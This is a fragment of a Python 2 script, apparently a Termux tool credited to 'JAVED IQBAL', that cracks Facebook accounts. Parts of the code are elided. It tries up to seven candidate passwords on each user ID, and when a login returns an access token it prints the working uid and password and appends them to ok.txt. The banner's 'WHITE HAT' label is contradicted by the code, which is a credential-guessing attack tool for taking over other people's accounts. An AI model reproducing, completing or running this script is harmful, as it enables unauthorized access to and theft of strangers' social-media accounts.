#coding=utf-8
#!/usr/bin/python2
#Originally Written By  JAVED CYBER EXPERT
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 Javed2.py")
os.system("clear")
"""
try:
...
#MyLogo
def logo():
    os.system('echo -e "██🏴‍☠️🇵🇰🏴‍☠️░\n██JAVED IQBAL\n█WHITE HAT\n MMN Coder║ \n██║Alone NNM TEAM\n\n-----------------------------------------------\n\n➣ Codded By : JAVED IQBAL\n➣ Facebook  : javediqbalbalooch\n➣ FB Group   : NNM COMMAND FOR TERMUX\n➣ Whatsap   : 03422008140\n\n-----------------------------------------------" | lolcat')
def method_menu():
    os.system("clear")
    logo()
    print("")
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            print("\x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    print("\x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print(" \x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m[OK.NNM] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
...
def l_menu_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error"]:
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m[OK.NNM] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
